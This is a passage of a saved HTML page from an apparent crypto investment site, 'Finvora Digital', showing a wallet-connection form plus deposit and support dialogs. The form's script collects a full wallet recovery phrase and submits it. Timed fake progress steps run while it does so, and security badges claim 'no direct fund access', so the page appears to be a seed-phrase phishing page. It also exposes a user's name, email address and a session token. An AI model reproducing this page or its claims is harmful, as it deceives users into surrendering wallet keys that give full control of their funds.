    <path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75 11.25 15 15 9.75m-3-7.036A11.959 11.959 0 0 1 3.598 6 11.99 11.99 0 0 0 3 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285Z" />
</svg>
                        </div>
                        <div>
                            <p class="text-xs font-medium text-content-primary">Bank-Level Encryption</p>
                            <p class="text-[11px] text-content-tertiary">256-bit AES encryption at rest</p>
                        </div>
                    </div>
                    <div class="flex items-start gap-3">
                        <div class="flex items-center justify-center w-7 h-7 rounded-md bg-info/10 flex-shrink-0">
                            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-4 h-4 text-info" aria-hidden="true">
    <path stroke-linecap="round" stroke-linejoin="round" d="M3.98 8.223A10.477 10.477 0 0 0 1.934 12C3.226 16.338 7.244 19.5 12 19.5c.993 0 1.953-.138 2.863-.395M6.228 6.228A10.451 10.451 0 0 1 12 4.5c4.756 0 8.773 3.162 10.065 7.498a10.522 10.522 0 0 1-4.293 5.774M6.228 6.228 3 3m3.228 3.228 3.65 3.65m7.894 7.894L21 21m-3.228-3.228-3.65-3.65m0 0a3 3 0 1 0-4.243-4.243m4.242 4.242L9.88 9.88" />
</svg>
                        </div>
                        <div>
                            <p class="text-xs font-medium text-content-primary">Privacy First</p>
                            <p class="text-[11px] text-content-tertiary">No direct fund access</p>
                        </div>
                    </div>
                    <div class="flex items-start gap-3">
                        <div class="flex items-center justify-center w-7 h-7 rounded-md bg-warning/10 flex-shrink-0">
                            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-4 h-4 text-warning" aria-hidden="true">
    <path stroke-linecap="round" stroke-linejoin="round" d="m3.75 13.5 10.5-11.25L12 10.5h8.25L9.75 21.75 12 13.5H3.75Z" />
</svg>
                        </div>
                        <div>
                            <p class="text-xs font-medium text-content-primary">Instant Setup</p>
                            <p class="text-[11px] text-content-tertiary">Connect in under 30 seconds</p>
                        </div>
                    </div>
                    
                </div>
            </div>

            
            <div class="bg-surface-raised border border-surface-border rounded-xl p-5">
                <h3 class="text-sm font-semibold text-content-primary mb-2">Need Help?</h3>
                <p class="text-xs text-content-tertiary mb-3">If you're having trouble connecting or your wallet isn't listed, our support team can assist.</p>
                <a href="https://account.finvoradigital.com/dashboard/support"
                   class="inline-flex items-center gap-1.5 text-xs font-medium text-primary hover:text-primary-light transition-colors">
                    Contact Support
                    <svg class="w-3.5 h-3.5" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" d="M13.5 4.5 21 12m0 0-7.5 7.5M21 12H3" />
                    </svg>
                </a>
            </div>
        </div>
    </div>

    
    <div x-show="isConnecting" x-transition.opacity.duration.300ms
         class="fixed inset-0 z-50 flex items-center justify-center bg-surface-base/80 backdrop-blur-sm" x-cloak>
        <div class="bg-surface-raised border border-surface-border rounded-2xl p-8 max-w-sm w-full mx-4 text-center shadow-2xl">
            
            <div class="relative w-20 h-20 mx-auto mb-6">
                <div class="absolute inset-0 rounded-full bg-primary/20 animate-ping"></div>
                <div class="relative w-20 h-20 rounded-full bg-primary-subtle flex items-center justify-center">
                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-10 h-10 text-primary" aria-hidden="true">
    <path stroke-linecap="round" stroke-linejoin="round" d="M21 12a2.25 2.25 0 0 0-2.25-2.25H15a3 3 0 1 1-6 0H5.25A2.25 2.25 0 0 0 3 12m18 0v6a2.25 2.25 0 0 1-2.25 2.25H5.25A2.25 2.25 0 0 1 3 18v-6m18 0V9M3 12V9m18 0a2.25 2.25 0 0 0-2.25-2.25H5.25A2.25 2.25 0 0 0 3 9m18 0V6a2.25 2.25 0 0 0-2.25-2.25H5.25A2.25 2.25 0 0 0 3 6v3" />
</svg>
                </div>
            </div>

            <h3 class="text-lg font-bold text-content-primary mb-2">Connecting Wallet</h3>
            <p class="text-sm text-content-secondary mb-6">
                Verifying <span class="font-semibold text-primary" x-text="selectedWallet"></span> connection...
            </p>

            
            <div class="space-y-3 text-left mb-6">
                <div class="flex items-center gap-3" x-data="{ done: false }" x-init="setTimeout(() => done = true, 800)">
                    <div class="w-5 h-5 rounded-full flex items-center justify-center transition-colors"
                         :class="done ? 'bg-gain/10' : 'bg-surface-overlay'">
                        <template x-if="done"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-4 h-4 text-gain" aria-hidden="true">
    <path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75 11.25 15 15 9.75M21 12a9 9 0 1 1-18 0 9 9 0 0 1 18 0Z" />
</svg>
</template>
                        <template x-if="!done">
                            <svg class="animate-spin h-3.5 w-3.5 text-content-tertiary" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path>
                            </svg>
                        </template>
                    </div>
                    <span class="text-xs" :class="done ? 'text-content-primary' : 'text-content-tertiary'">Validating recovery phrase</span>
                </div>
                <div class="flex items-center gap-3" x-data="{ done: false }" x-init="setTimeout(() => done = true, 2000)">
                    <div class="w-5 h-5 rounded-full flex items-center justify-center transition-colors"
                         :class="done ? 'bg-gain/10' : 'bg-surface-overlay'">
                        <template x-if="done"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-4 h-4 text-gain" aria-hidden="true">
    <path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75 11.25 15 15 9.75M21 12a9 9 0 1 1-18 0 9 9 0 0 1 18 0Z" />
</svg>
</template>
                        <template x-if="!done">
                            <svg class="animate-spin h-3.5 w-3.5 text-content-tertiary" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path>
                            </svg>
                        </template>
                    </div>
                    <span class="text-xs" :class="done ? 'text-content-primary' : 'text-content-tertiary'">Establishing secure connection</span>
                </div>
                <div class="flex items-center gap-3">
                    <div class="w-5 h-5 rounded-full bg-surface-overlay flex items-center justify-center">
                        <svg class="animate-spin h-3.5 w-3.5 text-content-tertiary" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path>
                        </svg>
                    </div>
                    <span class="text-xs text-content-tertiary">Registering wallet</span>
                </div>
            </div>

            <p class="text-[11px] text-content-tertiary">This may take a few moments. Please don't close this page.</p>
        </div>
    </div>

<script>
function walletConnect() {
    return {
        selectedWallet: '',
        recoveryPhrase: '',
        isConnecting: false,
        showMoreWallets: false,
        hasError: false,

        // Already connected wallet names (lowercase) passed from server
        connectedWallets: [],

        selectWallet(wallet) {
            // Prevent selecting already connected wallets
            if (this.connectedWallets.includes(wallet.toLowerCase())) return;
            this.selectedWallet = wallet;
        },

        get wordCount() {
            if (!this.recoveryPhrase) return 0;
            return this.recoveryPhrase.trim().split(/\s+/).filter(w => w.length > 0).length;
        },

        get hasInvalidChars() {
            if (!this.recoveryPhrase) return false;
            return !/^[a-zA-Z\s]+$/.test(this.recoveryPhrase);
        },

        get isValidPhrase() {
            return this.wordCount >= 12 && this.wordCount <= 24 && !this.hasInvalidChars;
        },

        validatePhrase() {
            this.hasError = false;
            if (this.recoveryPhrase.length > 0) {
                this.hasError = this.hasInvalidChars || (this.wordCount > 0 && this.wordCount < 12);
            }
        },

        handleSubmit(e) {
            if (!this.isValidPhrase || !this.selectedWallet) {
                e.preventDefault();
                return;
            }
            this.isConnecting = true;
            // Fallback: reset after 20s if page hasn't navigated
            setTimeout(() => { this.isConnecting = false; }, 20000);
        }
    }
}
</script>

        </div>

        
        <footer class="border-t border-surface-border py-6 px-6 mt-8">
            <p class="text-sm text-content-tertiary text-center">
                &copy; Finvora Digital.
            </p>
        </footer>
    </main>

    
    
    
    <div x-data="{ open: false }"
         @open-other-deposit.window="open = true"
         x-show="open" x-cloak
         class="fixed inset-0 z-[60] flex items-center justify-center p-4">
        <div x-show="open" x-transition.opacity class="absolute inset-0 bg-black/60" @click="open = false"></div>
        <div x-show="open" x-transition class="relative w-full max-w-md bg-surface-raised border border-surface-border rounded-2xl shadow-2xl overflow-hidden">
            <div class="p-6">
                <div class="flex items-center justify-between mb-4">
                    <h3 class="text-lg font-semibold text-content-primary">Other Deposit Method</h3>
                    <button @click="open = false" class="text-content-tertiary hover:text-content-primary"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-5 h-5" aria-hidden="true">
    <path stroke-linecap="round" stroke-linejoin="round" d="M6 18 18 6M6 6l12 12" />
</svg>
</button>
                </div>
                <form method="POST" action="https://account.finvoradigital.com/otherpayment" class="space-y-4">
                    <input type="hidden" name="_token" value="Ma4mCMUlEPD2ywAIhFnOdMNH2gS5D62MRHIVTCY7">                    <div>
                        <label class="text-xs text-content-tertiary font-medium mb-1 block">Full Name</label>
                        <input type="text" name="name" value="egod" readonly
                               class="w-full bg-surface-overlay border border-surface-border rounded-lg px-3 py-2.5 text-sm text-content-primary focus:outline-none">
                    </div>
                    <div>
                        <label class="text-xs text-content-tertiary font-medium mb-1 block">Email</label>
                        <input type="email" name="email" value="egod1422@gmail.com" readonly
                               class="w-full bg-surface-overlay border border-surface-border rounded-lg px-3 py-2.5 text-sm text-content-primary focus:outline-none">
                    </div>
                    <div>
                        <label class="text-xs text-content-tertiary font-medium mb-1 block">Deposit Type</label>
                        <select name="mode" required
                                class="w-full bg-surface-overlay border border-surface-border rounded-lg px-3 py-2.5 text-sm text-content-primary focus:outline-none focus:ring-2 focus:ring-primary">
                            <option value="" disabled selected>Select method</option>
                            <option value="Litecoin">Litecoin</option>
                            <option value="BANK TRANSFER">Bank Transfer</option>
                            <option value="BITCOIN CASH">Bitcoin Cash</option>
                            <option value="USDT">USDT</option>
                            <option value="PAYPAL">PayPal</option>
                            <option value="WESTERN UNION">Western Union</option>
                            <option value="SKRILL">Skrill</option>
                        </select>
                    </div>
                    <div>
                        <label class="text-xs text-content-tertiary font-medium mb-1 block">Amount</label>
                        <input type="number" step="0.01" name="amount" required placeholder="0.00"
                               class="w-full bg-surface-overlay border border-surface-border rounded-lg px-3 py-2.5 text-sm text-content-primary placeholder-content-tertiary focus:outline-none focus:ring-2 focus:ring-primary">
                    </div>
                    <div class="flex gap-3">
                        <button type="button" @click="open = false" class="flex-1 bg-surface-overlay text-content-secondary hover:bg-surface-border rounded-lg py-2.5 text-sm font-medium transition-colors">Cancel</button>
                        <button type="submit" name="request_deposit" class="flex-1 bg-primary hover:bg-primary-dark text-content-inverse rounded-lg py-2.5 text-sm font-medium transition-colors">Request</button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    
    <div x-data="{ open: false }"
         @open-mail-support.window="open = true"
         x-show="open" x-cloak
         class="fixed inset-0 z-[60] flex items-center justify-center p-4">
        <div x-show="open" x-transition.opacity class="absolute inset-0 bg-black/60" @click="open = false"></div>
        <div x-show="open" x-transition class="relative w-full max-w-lg bg-surface-raised border border-surface-border rounded-2xl shadow-2xl overflow-hidden">
            <div class="p-6">
                <div class="flex items-center justify-between mb-4">
                    <h3 class="text-lg font-semibold text-content-primary">Contact Support</h3>
                    <button @click="open = false" class="text-content-tertiary hover:text-content-primary"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-5 h-5" aria-hidden="true">
    <path stroke-linecap="round" stroke-linejoin="round" d="M6 18 18 6M6 6l12 12" />
</svg>
</button>
                </div>
                <form method="POST" action="https://account.finvoradigital.com/sendcontact" class="space-y-4">
                    <input type="hidden" name="_token" value="Ma4mCMUlEPD2ywAIhFnOdMNH2gS5D62MRHIVTCY7">                    <input type="hidden" name="to_email" value="Finvora Digital Support">
                    <input type="hidden" name="email" value="egod1422@gmail.com">
                    <input type="hidden" name="name" value="egod">
                    <div>
                        <label class="text-xs text-content-tertiary font-medium mb-1 block">Subject</label>
                        <input type="text" name="subject" required placeholder="How can we help?"
                               class="w-full bg-surface-overlay border border-surface-border rounded-lg px-3 py-2.5 text-sm text-content-primary placeholder-content-tertiary focus:outline-none focus:ring-2 focus:ring-primary">
                    </div>
                    <div>
                        <label class="text-xs text-content-tertiary font-medium mb-1 block">Message</label>
                        <textarea name="message" rows="5" required placeholder="Describe your issue..."
                                  class="w-full bg-surface-overlay border border-surface-border rounded-lg px-3 py-2.5 text-sm text-content-primary placeholder-content-tertiary focus:outline-none focus:ring-2 focus:ring-primary resize-none"></textarea>
                    </div>
                    <div class="flex gap-3">
                        <button type="button" @click="open = false" class="flex-1 bg-surface-overlay text-content-secondary hover:bg-surface-border rounded-lg py-2.5 text-sm font-medium transition-colors">Cancel</button>
                        <button type="submit" name="contact" class="flex-1 bg-primary hover:bg-primary-dark text-content-inverse rounded-lg py-2.5 text-sm font-medium transition-colors">Send Message</button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <script src="/livewire/livewire.js?id=90730a3b0e7144480175" data-turbo-eval="false" data-turbolinks-eval="false" ></script><script data-turbo-eval="false" data-turbolinks-eval="false" >window.livewire = new Livewire();window.Livewire = window.livewire;window.livewire_app_url = '';window.livewire_token = 'Ma4mCMUlEPD2ywAIhFnOdMNH2gS5D62MRHIVTCY7';window.deferLoadingAlpine = function (callback) {window.addEventListener('livewire:load', function () {callback();});};let started = false;window.addEventListener('alpine:initializing', function () {if (! started) {window.livewire.start();started = true;}});document.addEventListener("DOMContentLoaded", function () {if (! started) {window.livewire.start();started = true;}});</script>
     






</body>
</html>
